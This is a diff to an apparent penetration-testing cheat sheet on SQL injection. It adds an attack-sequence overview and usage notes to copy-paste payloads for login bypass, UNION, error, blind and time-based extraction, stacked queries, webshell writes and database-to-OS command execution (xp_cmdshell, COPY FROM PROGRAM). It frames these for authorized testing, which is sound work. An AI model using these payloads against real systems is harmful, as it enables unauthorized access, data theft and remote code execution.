@@ -1,5 +1,7 @@
 # SQL-Injection Arsenal — Detection, UNION, Error, Blind, Time, OOB, Auth-Bypass, File R/W, RCE & Evasion (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `SQL_INJECTION_TESTING_GUIDE.md`. Authorized testing only — **benign proof** (`version()`, one benign row),
 > **no mass dump**, **no destructive writes on production** (Guide §25). The finding is **the query behaving differently
 > with a concrete impact** (RCE / auth bypass / read), not a reflected quote or a lone 500. Every payload is **context-**
@@ -10,7 +12,41 @@
 
 ---
 
+## §0.0 — The whole attack in one sequence
+
+*What & when:* the entire SQLi run on one screen — the **decision spine** every block below plugs into. SQLi is not "paste payloads until one errors"; it's a pipeline: **prove the query changed** (not that an error reflected) → **fingerprint the engine** → **pick the ONE channel the target gives you** → **prove impact with a benign minimum** → **stop**. Follow the arrows; jump to the matching section for the payloads.
+
+```
+# ── 1. RECON every sink (Guide §3) ───────────────────────────────────────
+GET/POST params · JSON fields · path segments · AND headers (Host / UA / X-Forwarded-For / Referer) · cookies
+#   (Accellion CVE-2021-27101 was the Host header; Drupalgeddon was an array KEY — inject beyond the obvious value)
+
+# ── 2. BASELINE: is it SQLi, and what CONTEXT? (Guide §4–§5) — the VALIDITY gate ──
+id=14'                 → error?           (grammar touched — but an error ALONE is not proof)
+id=15-1  → returns row 14?               → NUMERIC context (math evaluated server-side)   ← query CHANGED = real
+id=14 AND 1=1  vs  AND 1=2 → results flip → BOOLEAN oracle confirms it                       ← this is the proof
+#   string context? → ' AND '1'='1 vs '1'='2   ·   identifier/ORDER BY? → ' useless, use index/CASE (Joomla CVE-2017-8917)
+
+# ── 3. FINGERPRINT the engine (Guide §6) ─────────────────────────────────
+error text · version()/@@version/banner · concat (||, +, CONCAT) · sleep dialect → MySQL/PostgreSQL/MSSQL/Oracle/SQLite
+
+# ── 4. PICK ONE CHANNEL, in this order of ease (Guide §6–§10) ─────────────
+errors shown?  → error-based extract (fastest)      |  results shown? → UNION (col-count via ORDER BY, find visible col)
+boolean diff?  → boolean blind (binary search)      |  neither?        → TIME blind (conditional sleep)  |  all blind? → OOB/DNS
+
+# ── 5. PROVE IMPACT — benign minimum, then STOP (Guide §12–§16, §25) ──────
+auth bypass:  ' OR 1=1-- -   (log in as admin, YOUR test acct)      |   read:   @@version + DB_NAME() + ONE row (not a dump)
+FILES:        MySQL LOAD_FILE / INTO OUTFILE · PG COPY · MSSQL OPENROWSET      |   webshell: INTO OUTFILE webroot (§15)
+RCE (ceiling): MSSQL xp_cmdshell · PG COPY..FROM PROGRAM/UDF · MySQL UDF   → single benign cmd (whoami), restore, no persist
+```
+
+> **Cash-out map (Guide §23 severity):** query-changed → **read** (DB dump = High) → **auth bypass** (`admin'-- -` = High/Crit) → **file read** (`.env`/config → DB/cloud creds) → **write webshell** / **OS RCE** (`xp_cmdshell`/`COPY..FROM PROGRAM` = **Critical, CWE-89→CWE-78**, the MOVEit arc) → **privesc / linked-server lateral** (§17). Reflected error with **no** query change? Not SQLi — don't report it (§22). Full worked run: **guide Appendix E**.
+
+---
+
 ## 0. The 60-second triage set (send each, watch the response) — Guide §4
+
+> **What & when:** the very first thing you fire at any suspected sink — a handful of tiny pokes that answer the three questions that decide everything: *can I touch the grammar* (`'` errors?), *where does my word sit* (`2-1` returns row 1 → numeric), and *how does it answer me* (boolean diff? time delay? UNION-able?). Run this whole block before reaching for a single "real" payload; its answers tell you which section below to jump to.
 
 ```
 id=1'                         → SQL error / 500 / different page?         (string break / error-based)
@@ -27,6 +63,8 @@ id=1' UNION SELECT NULL-- -  …add NULLs…  → no error at the right count �
 ---
 
 ## 1. Context break-out — Guide §5
+
+> **What & when:** pick the sub-block that matches *where your word sits*, which §0 just told you. String context (`'INPUT'`) → you need a `'` to pry it open. Numeric (`id=INPUT`) → no quote, inject bare. Paren/function wrapper → close the extra `)` first. Identifier (`ORDER BY`) → `'` is useless, use index/CASE/subquery. Using the wrong block wastes payloads — this is the "match the crowbar to the lock" step.
 
 ```
 STRING context  ( …'INPUT'… ):
@@ -55,6 +93,8 @@ LIKE context  ( …LIKE 'INPUT%' ):
 
 ## 2. Authentication bypass — Guide §12
 
+> **What & when:** use these on any **login/lookup** form. Two ideas: `admin'-- -` comments out the "AND password=..." half so only the username is checked (you become admin, no password); `' OR '1'='1` makes the condition always-true so a row always returns. Try the comment style first, the always-true style second, and note *which* account you land on (admin = Critical, first row = High). Test against your own target/account only.
+
 ```
 # login builds  SELECT * FROM users WHERE user='$u' AND pass='$p'   (pass = anything)
 COMMENT OUT password:
@@ -72,6 +112,8 @@ NUMERIC login id:    1 OR 1=1-- -
 ```
 
 ## 3. UNION-based — Guide §9
+
+> **What & when:** the fastest channel — use it whenever the page **displays query results**. Two mechanical prerequisites, in order: first find the **column count** (climb `ORDER BY 1,2,3...` until it errors, or add `NULL`s until it stops erroring), then find which column **shows on the page and accepts text** (rotate a marker `'a'` through the positions). Once you have a visible text column, concatenate your stolen data into it. For the PoC pull `version()` + one row — not the whole table.
 
 ```
 COLUMN COUNT:
@@ -93,6 +135,8 @@ GROUP/AGG to one cell:
 
 ## 4. Error-based extraction (errors shown) — Guide §6
 
+> **What & when:** use when the app **shows database error messages**. You feed the engine a value it's forced to choke on (convert a password to a number, break an XML function) and it prints your stolen data *inside* the error while complaining. Pick the block matching the engine §0 fingerprinted. Note the MySQL `extractvalue`/`updatexml` route returns only ~32 characters per shot, so long values need chunking (`SUBSTRING`).
+
 ```
 MySQL (extractvalue/updatexml — ~32 chars per shot):
   ' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -
@@ -110,6 +154,8 @@ Oracle (ORA error carrying value):
 ```
 
 ## 5. Boolean-based blind — Guide §7
+
+> **What & when:** use when there's **no data and no error, but true vs false changes the page** (a marker string, a length delta). First lock in your reliable true/false pair, then read values as a stream of yes/no questions — binary-search each character's ASCII code (`>` comparisons) to spend ~7 requests/char instead of ~95. Get the length first so you know when to stop. It's request-heavy, so let `sqli_blind.py` grind it. Prove with a short benign value (`database()`), not the whole `users` table.
 
 ```
 ORACLE (the true/false pair):
@@ -130,6 +176,8 @@ python3 poc/sqli_blind.py -u "https://target/item?id=1" --inject id \
 ```
 
 ## 6. Time-based blind — Guide §8
+
+> **What & when:** the last-resort channel — use when the page looks **identical** for true and false (no error, no boolean diff). You make the database *pause 5 seconds* when your guess is right and read answers off the clock. Each engine spells "pause" differently (so the one that works also fingerprints it). Always confirm it's real: the `SLEEP(5)` variant delays while `SLEEP(0)` returns fast, **repeatably** — a merely-slow endpoint is not time-based. Slow and loud, so prefer boolean/UNION when available.
 
 ```
 MySQL:       ' AND SLEEP(5)-- -        1 AND SLEEP(5)        ' OR IF(1=1,SLEEP(5),0)-- -
@@ -163,6 +211,8 @@ A single DNS hit carrying database() = irrefutable, fast proof.
 ```
 
 ## 8. Stacked queries — Guide §11
+
+> **What & when:** test this on **PostgreSQL/MSSQL** (and sometimes SQLite) — it's the gateway from "read-only injection" to *writing* and *running commands*. A `;` ends the app's sentence and starts a brand-new one of yours (`UPDATE`, `xp_cmdshell`, `COPY FROM PROGRAM`). Confirm support **safely first** with a read-only delay (`'; WAITFOR DELAY '0:0:5'`); only then reach for a write, and scope any write to your own test row — never a table-wide `UPDATE`/`DROP`.
 
 ```
 TEST (a delay on the SECOND statement = stacked enabled):
@@ -204,6 +254,8 @@ PREREQS (all): write priv + known absolute webroot + that dir is web-served + fi
 ```
 
 ## 11. RCE per DBMS — Guide §16
+
+> **What & when:** the top of the tree — use once you've confirmed **stacked queries + a privileged DB account** (§8, §12). Each engine has a built-in that shells out to the OS: MSSQL `xp_cmdshell`, PostgreSQL `COPY ... FROM PROGRAM`, MySQL a loaded UDF (high bar — usually prefer file-write→webshell, §10). Output often isn't inline, so capture it via a temp table or OOB. Run **one** benign command (`whoami`), capture the single line, and **stop** — that's a complete Critical; lead the report with it.
 
 ```
 MSSQL — xp_cmdshell:
